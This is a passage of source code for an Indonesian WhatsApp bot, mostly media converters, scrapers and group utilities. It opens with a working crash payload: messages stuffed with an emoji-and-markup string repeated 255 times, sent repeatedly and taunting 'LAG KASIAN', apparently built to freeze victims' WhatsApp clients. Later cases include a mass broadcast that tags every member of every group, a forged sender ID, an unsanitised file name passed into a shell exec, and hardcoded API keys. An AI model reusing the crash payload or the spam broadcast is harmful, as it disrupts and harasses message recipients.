                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY ALBYS" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
                'mediaType': 0x1
              }
            }
          }, tilol);
          await sleep(2000);
          const tilol1 = {
            quoted: batuo
          };
          KhaerulZx.sendMessage(m.chat, {
            'text': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY ALBYS" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
                'mediaType': 0x1
              }
            }
          }, tilol1);
          await sleep(2000);
          const tilol2 = {
            quoted: batuo
          };
          KhaerulZx.sendMessage(m.chat, {
            'text': "`🔥 WE ARE ALBYS 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY ALBYS" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE ALBYS𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\nhttps://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q",
                'mediaType': 0x1
              }
            }
          }, tilol2);
        }
        break;
        


//=================================================//

//=================================================//

//=================================================

//=================================================

//=================================================

//=================================================

//=================================================

//=================================================//

//=================================================//

//=================================================//

case 'tomp4': case 'tovideo': {
    if (banned.includes(m.sender)) {
        return;
    }
        if (!isCreator) return;
    if (!/webp/.test(mime)) return reply(`Reply stiker dengan caption *${prefix + command}*`);
reply(mess.wait);
    let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted, new Date() * 1);
    try {
        let uploadResult = await uploadUguu(media);
        KhaerulZx.sendMessage(from, { video: { url: uploadResult.result }, caption: 'Convert Sticker To Video' }, { quoted: fkontak });
    } catch (error) {
        reply('Gagal mengunggah video ke Uguu. Coba lagi nanti.');
    }
}
break;
case "toril": case 'toanime': {
if (banned.includes(m.sender)) {
    return;
    }

                if (!quoted) return reply(`Fotonya Mana?`)
                if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
const api = {
    xterm: {
        url: "https://ai.xterm.codes",
        key: "YoriChan"
    }
}; 
                let { key } = await KhaerulZx.sendMessage(m.chat, { text: mess.wait }, { quoted: m })
                let type = "anime2d"
                if (["jadinyata", "toreal"].includes(command)) {
                    type = "anime2real"
                }
                let tryng = 0
                const media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
                let tph = await TelegraPh(media)
                try {
                    let ai = await fetch(api.xterm.url + "/api/img2img/filters?action=" + type + "&url=" + tph + "&key=" + api.xterm.key).then(a => a.json())
                    console.log(ai)
                    if (!ai.status) return reply(ai?.msg || "Error!")
                    while (tryng < 55) {
                        let s = await fetch(api.xterm.url + "/api/img2img/filters/batchProgress?id=" + ai.id).then(a => a.json())
                        await KhaerulZx.sendMessage(m.chat, { text: s?.progress || "Prepare... ", edit: key }, { quoted: m })
                        if (s.status == 3) {
                            return KhaerulZx.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m })
                        }
                        if (s.status == 4) {
                            return reply("Maaf terjadi kesalhan. coba gunakan gambar lain!")
                        }
                        await new Promise(resolve => setTimeout(resolve, 5000))
                    }
                } catch (e) {
                    console.error(e)
                    reply(`Type-Err! :\n${e}`)
                }
            }
                break
case 'toptv':{
if (banned.includes(m.sender)) {
    return;
    }
if (!m.quoted) return reply('```Reply Videonya Untuk Di Jadikan Ptv [!]```')
if(isMedia || q) {
const toptvv = {key: {fromMe: true, participant: `6283897387848@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `Powered By Finsii`}}}
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
KhaerulZx.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'tovn':{
if (banned.includes(m.sender)) {
    return;
    }
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
KhaerulZx.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio':{
if (banned.includes(m.sender)) {
    return;
    }
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
KhaerulZx.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'tomp3': {
if (banned.includes(m.sender)) {
    return;
    }
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
KhaerulZx.sendMessage(from, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: 'https://youtube.com/@KyyYete-',
title: `Converter mp3`,
sourceUrl: `${global.saluran}`,
thumbnail: ppnyauser
}
}})
}
break
//=================================================//
case 'togif': {
if (banned.includes(m.sender)) {
    return;
    }
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./lib/uploader')
let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await KhaerulZx.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
try {
if (banned.includes(m.sender)) {
    return;
    }
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply('tunggu sebentar')
let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
KhaerulZx.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
case  'qcimg':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await KhaerulZx.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await KhaerulZx.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64")
KhaerulZx.sendMessage(from,{image: buffer},{quoted : m})
})
}
break
case 'addgc':
if (banned.includes(m.sender)) {
    return;
    }
    if (!m.isGroup) return reply(mess.group)         

if (!isCreator) return reply(`khusus Creator`)

ntilink.push(m.chat)
        fs.writeFileSync('./database/idgroup.json', JSON.stringify(ntilink))

reply(`${command} sukses`)

           break
case 'delgc':
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`khusus Creator`)

    if (!m.isGroup) return reply(mess.group)

var ini = ntilink.indexOf(m.chat)

ntilink.splice(ini, 1)

fs.writeFileSync('./database/idgruop.json', JSON.stringify(ntilink))

reply(`${command} sukses`)

break
case 'hanime-trend': { 
if (!isCreator) return reply(`khusus Creator`)
const axios = require('axios'); 
const cheerio = require('cheerio'); 
// wm avz 
async function getImageUrl(titleUrl) { 
try { 
const { data } = await axios.get(titleUrl); 
const $ = cheerio.load(data); 
const imgUrl = $('.hvpi-cover-container img').attr('src'); 
return imgUrl || 'No image found'; 
} catch (error) { 
console.error('Error fetching image URL:', error.message); 
return 'Error fetching image'; 
} 
}
 // wm avz 
async function trend(m) { 
try { 
const { data } = await axios.get('https://hanime.tv/browse/trending'); 
const $ = cheerio.load(data); 
const titles = []; 
$('.layout.results .card a').each((index, element) => { 
const title = $(element).attr('title'); 
const url = $(element).attr('href'); 
if (title && url) { 
titles.push({ title, url: `https://hanime.tv${url}` }); 
} 
}); 
for (const title of titles) { 
title.imgUrl = await getImageUrl(title.url); 
} 
let responseMessage = 'Trending Titles:\n\n'; 
titles.forEach(item => { 
responseMessage += `_Title:_ ${item.title}\n_URL:_ ${item.url}\n_Image URL:_ ${item.imgUrl}\n\n`; 
}); 
if (m && typeof m.reply === 'function') { 
m.reply(responseMessage); 
} else { 
console.log(responseMessage); 
} 
} catch (error) { 
if (m && typeof m.reply === 'function') { 
m.reply('Error fetching trending titles. Please try again later.'); 
} else { 
console.error('Error fetching trending titles:', error.message); 
} 
} 
} 
trend(m); 
} 
break 
// TAGS 
case 'hanime-tags': { 
if (!isCreator) return reply(`khusus Creator`)
if (!q) return m.reply(`example hanime-tags futanari`) 
const axios = require('axios'); 
const cheerio = require('cheerio'); 
async function avzzz(query, m) { 
const url = `https://hanime.tv/browse/tags/${query}`; 
try { 
const { data } = await axios.get(url); 
const $ = cheerio.load(data); 
let videoUrls = []; 
$('.layout.results.flex.row .flex.xs12.justify-center.align-center.wrap a.card').each((index, element) => { 
const videoUrl = `https://hanime.tv${$(element).attr('href')}`; 
videoUrls.push(videoUrl); 
}); 
if (videoUrls.length > 0) { 
let allDetails = []; 
for (const videoUrl of videoUrls) { 
const details = await avus(videoUrl); 
allDetails.push(details); 
} 
const formattedDetails = allDetails.map(detail => ` 
Title: ${detail.title} 
Views: ${detail.views} 
Likes: ${detail.likes} 
Dislikes: ${detail.dislikes} 
Download Link: ${detail.downloadLink} 
Image: ${detail.imgSrc} 
Video URL: ${detail.videoUrl} 
`).join('\n\n'); 
m.reply(`Found video details:\n${formattedDetails}`); 
} else {
m.reply('No videos.');
}
} catch (error) { 
console.error('Error:', error); 
m.reply('An error.'); 
} 
} 
// wm avz 
async function avus(videoUrl) { 
try { 
const { data } = await axios.get(videoUrl); 
const $ = cheerio.load(data); 
const title = $('h1.tv-title').text().trim(); 
const views = $('.tv-views.grey--text').text().trim(); 
const likes = $('.mdi-heart + .hvpabb-text').text().trim() || '0'; 
const dislikes = $('.mdi-heart-off + .hvpabb-text').text().trim() || '0'; 
const downloadLink = $('.mdi-cloud-download').closest('a').attr('href'); 
const imgSrc = $('.hvpi-cover-container img').attr('src'); 
// wm avz 
return { 
title, 
views, 
likes, 
dislikes, 
downloadLink: `https://hanime.tv${downloadLink}`, 
imgSrc, 
videoUrl 
}; 
// wm avz 
} catch (error) { 
console.error('Error:', error); 
return { 
title: 'Unknown', 
views: 'Unknown', 
likes: 'Unknown', 
dislikes: 'Unknown', 
downloadLink: 'Unknown', 
imgSrc: 'Unknown', 
videoUrl: 'Unknown' 
};
}
}
// wm avz 
const query = `${encodeURIComponent(text)}` 
avzzz(query, m); 
} 
break

case'nuliskiri': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await KhaerulZx.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}
  })   
const tulisan = body.slice(11)
KhaerulZx.sendMessage(m.chat, {image:{url:`https://api.zeeoneofc.my.id/api/canvas/${command}?apikey=y78GzVZCjtLIVri&text=${q}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case'nuliskanan': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await KhaerulZx.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
const tulisan = body.slice(12)
KhaerulZx.sendMessage(m.chat, {image:{url:`https://api.zeeoneofc.my.id/api/canvas/${command}?apikey=y78GzVZCjtLIVri&text=${q}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case'foliokiri': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await KhaerulZx.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}
  })   
const tulisan = body.slice(11)
KhaerulZx.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=y78GzVZCjtLIVri`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case'foliokanan': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await KhaerulZx.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}
  })   
const tulisan = body.slice(12)
.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=y78GzVZCjtLIVri`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case 'cekmem': 
case 'cekmember': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
let kntl = `CEK MEMBER *${groupName}*\n• ${groupMetadata.participants.length} Member grup!`
m.reply(kntl)
}
break
case 'create-polling': {
if (banned.includes(m.sender)) {
    return;
    }
function checkDuplicate(arr) {
    return new Set(arr).size !== arr.length
}
    let a = q.split("|").slice(1)
    if (!a[1] && !q) return m.reply(`*Contoh :*\n${prefix+command} Setuju gak |Setuju|Gak`)
    if (a[12]) return m.reply('Kebanyakan pilihan, Format\n' + prefix + command + 'Jayy kull? |Iya Lah|Gak')
    if (checkDuplicate(a)) return m.reply('Pilihan polling nya ada yang sama kak :v')
    let nama = await KhaerulZx.getName(m.sender)
    let b = text.split('|')
    let cap = `Polling For *${groupName}*\n\n*Nama :* ${nama}\n*Pesan :* ${text.split('|')[0]}`

    const pollMessage = {
        name: cap,
        values: a,
        multiselect: false,
        selectableCount: 1
    }
    await KhaerulZx.sendMessage(m.chat, {
        poll: pollMessage
    })
}
break
case 'clearall': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('Fitur Khusus Owner!')
KhaerulZx.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'quotesrenungan':
case 'qrenungan': {
if (banned.includes(m.sender)) {
    return;
    }
const renung = [
"https://telegra.ph/file/f52f8d6312f3ac2590727.jpg", 
"https://telegra.ph/file/35cb9decc525a3453ba87.jpg",
"https://telegra.ph/file/5996566cb5cd615f60f51.jpg",
"https://telegra.ph/file/87ecb0f385ae390c609e8.jpg",
"https://telegra.ph/file/7ca48dd2329937b7f86da.jpg", 
"https://telegra.ph/file/e2d603fa0ec9004ca9e2f.jpg",
"https://telegra.ph/file/f8f9ac3d38c9e3c9456ec.jpg",
"https://telegra.ph/file/9e1f626f4005b6f16d904.jpg",
"https://telegra.ph/file/6300478b6ffdf0c0001e9.jpg",
"https://telegra.ph/file/dca222749fb98ce0384f7.jpg",
"https://telegra.ph/file/295f6f6164794a2156d2e.jpg",
"https://telegra.ph/file/429cb39112f2870327398.jpg",
"https://telegra.ph/file/9d96d5fcc89c6f30e086f.jpg",
"https://telegra.ph/file/c396c9da3800536792139.jpg",
"https://telegra.ph/file/6d2fc9ac5c878fa93c43f.jpg",
"https://telegra.ph/file/09174bfbe94a756a90411.jpg",
"https://telegra.ph/file/2dcd363e5f9eb42d88cc0.jpg",
"https://telegra.ph/file/798daf4f7a87bbabc8694.jpg",
"https://telegra.ph/file/4052c388390385d9c79f3.jpg", 
"https://telegra.ph/file/d8f1a14f712d6a860b36c.jpg",
"https://telegra.ph/file/eed16ec2df3cc22102e7b.jpg",
"https://telegra.ph/file/0738833300f1620285b36.jpg",
"https://telegra.ph/file/dc464f93b5a579c279979.jpg",
"https://telegra.ph/file/0e0aa4e97675b2e649ddc.jpg",
"https://telegra.ph/file/2b58e9e63b38ac837e8cd.jpg",
"https://telegra.ph/file/49029a0e94ee5d710b6a9.jpg",
"https://telegra.ph/file/3a1ecc7774208670ec781.jpg",
"https://telegra.ph/file/46a125a6a3dc13cee931e.jpg",
"https://telegra.ph/file/37c358438489180b48723.jpg",
"https://telegra.ph/file/6287bc3f9b7876aeb5554.jpg",
"https://telegra.ph/file/684f268210c2de5d44bc6.jpg",
"https://telegra.ph/file/166b0d7fd1fcc55a09449.jpg",
"https://telegra.ph/file/f6713bdd595530bb38df9.jpg",
"https://telegra.ph/file/6738bff78091aa85a6cd7.jpg",
"https://telegra.ph/file/370d394c23fd162c6c9be.jpg",
"https://telegra.ph/file/38f2ceb0daf966fe7ddcf.jpg",
"https://telegra.ph/file/d23c4cedab7bf64915ba2.jpg",
"https://telegra.ph/file/3e72698c996538ee50ccf.jpg",
"https://telegra.ph/file/0379370add3bbae122008.jpg",
"https://telegra.ph/file/873d1b18acf16088786ca.jpg",
"https://telegra.ph/file/823e0664c7edec135b847.jpg",
"https://telegra.ph/file/8c8da910ab52c7a2b7ccf.jpg",
"https://telegra.ph/file/8037b52b84e8c39060f89.jpg",
"https://telegra.ph/file/e6da062c873aca03d25d4.jpg",
"https://telegra.ph/file/ef307b95c45e77defd0e1.jpg",
"https://telegra.ph/file/d66123bde1e967adf72b9.jpg",
"https://telegra.ph/file/7a2a376d1d152d382ae1a.jpg",
"https://telegra.ph/file/f8d0253bb97ea30e04275.jpg",
"https://telegra.ph/file/bbe65705f8dc9558eb177.jpg",
"https://telegra.ph/file/c7530031da08b4441ee9f.jpg",
"https://telegra.ph/file/5c1f7320f1b457911c3c2.jpg",
"https://telegra.ph/file/5a8600f4651e9497f6562.jpg",
"https://telegra.ph/file/053032e59ced4dac9ed3d.jpg",
"https://telegra.ph/file/ef61d077b685d47a11ff0.jpg",
"https://telegra.ph/file/c8a5cc9b9da57299a1f25.jpg",
"https://telegra.ph/file/2ed057545501fc3bc8de0.jpg",
"https://telegra.ph/file/b3b7c0c22e7dba04cab03.jpg",
"https://telegra.ph/file/62579a62376550e6590b1.jpg",
"https://telegra.ph/file/d140b0791799af2f67315.jpg",
"https://telegra.ph/file/81fd213f74b1235ef18fc.jpg",
"https://telegra.ph/file/d00db1507843f4ead46d8.jpg",
"https://telegra.ph/file/dedfa2294f4eb845acac4.jpg",
"https://telegra.ph/file/2b3700178b39c9c01e9b4.jpg",
"https://telegra.ph/file/a7be3d06c7dd9b8475579.jpg",
"https://telegra.ph/file/f7d91295ec35c44af8c90.jpg",
"https://telegra.ph/file/01e42d9181311dd7d2d70.jpg",
"https://telegra.ph/file/e5cf6db288acbfbb13f2b.jpg",
"https://telegra.ph/file/5a6ee797141b96fcebcce.jpg",
"https://telegra.ph/file/88d5b22d7a40365f59fc4.jpg",
"https://telegra.ph/file/0de4de20e35f6c9b12af6.jpg",
"https://telegra.ph/file/6b60a05a32e7bdbb62c2d.jpg",
"https://telegra.ph/file/549e5a1dbd0aebbd909c6.jpg",
"https://telegra.ph/file/d9d0c658ef1ea088d3579.jpg",
"https://telegra.ph/file/4c8fa9809897b7bd3eb03.jpg",
"https://telegra.ph/file/a58ee2c51fdc6c78ed7f6.jpg",
"https://telegra.ph/file/f2253a885cb84af5d588c.jpg",
"https://telegra.ph/file/f17bd255b176da6943240.jpg",
"https://telegra.ph/file/279afb02b1fcf93abdae4.jpg",
"https://telegra.ph/file/8ba4a8f31cf0673f6aa87.jpg",
"https://telegra.ph/file/c842818563065460b022e.jpg",
"https://telegra.ph/file/99e10142aeef70961437a.jpg",
"https://telegra.ph/file/33da8321603f78cd165f4.jpg",
"https://telegra.ph/file/63678732998176b22fa96.jpg",
"https://telegra.ph/file/b79bb874be90a34cd5786.jpg",
"https://telegra.ph/file/148875b883f91ac8b42e6.jpg",
"https://telegra.ph/file/275d948e0ed99652b4c52.jpg",
"https://telegra.ph/file/dbfa4e1043d1bbc9441b2.jpg",
"https://telegra.ph/file/1ab030093aea5937e0468.jpg",
"https://telegra.ph/file/b5b64e5e5ee0df73bc5b5.jpg",
"https://telegra.ph/file/a7032cdd783d8f1656424.jpg",
"https://telegra.ph/file/5ea4218fedab8e124496b.jpg",
"https://telegra.ph/file/0e0fef10d278f886a5f4a.jpg",
"https://telegra.ph/file/09e81d73081d6f2811ca3.jpg",
"https://telegra.ph/file/816866bef7a307029e6b6.jpg",
"https://telegra.ph/file/5b5736027ae57a787d00c.jpg",
"https://telegra.ph/file/68899ab649fa4711905ce.jpg",
"https://telegra.ph/file/47b0c825cdf8ebaa90a05.jpg",
"https://telegra.ph/file/06aaa229521191de3895e.jpg",
"https://telegra.ph/file/68551e562c4e343efd965.jpg",
"https://telegra.ph/file/9487c11c728cd279b8da3.jpg"
]
const renunganx = renung[Math.floor(Math.random() * renung.length)]
KhaerulZx.sendMessage(m.chat, {image: {url: renunganx}, caption: '_Renungan_'}, {quoted: m})
}
break
case 'timergc': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
if (!text) return m.reply(`PILIH WAKTU RESET CHAT\n\n*Contoh :*\n${prefix+command} 90\n${prefix+command} 24\n${prefix+command}7\n${prefix+command} Mati`)
if (args[0] === "24") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
KhaerulZx.groupToggleEphemeral(m.chat, 1*24*3600)
m.reply('Timer di set ke 24 jam')
}
if (args[0] === "7") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
KhaerulZx.groupToggleEphemeral(m.chat, 7*24*3600)
m.reply('Timer di set ke 7 hari')
}
if (args[0] === "90") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
KhaerulZx.groupToggleEphemeral(m.chat, 90*24*3600)
m.reply('Timer di set ke 90 hari')
}
if (args[0] === "mati") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin grup!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
KhaerulZx.groupToggleEphemeral(m.chat, 0*24*3600)
m.reply('Timer telah di matikan')
}
}
break
case "jpm": case "post": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
reply(mess.wait)
let getGroups = await KhaerulZx.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await KhaerulZx.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await KhaerulZx.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await KhaerulZx.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(mess.success)
}
break
//NO BUTTON
case "startjpm": {
    if (banned.includes(m.sender)) return;
    if (!isCreator) return reply(mess.owner);
    var teksnya = await fs.readFileSync("./database/teksjpm.js").toString();
    if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database");
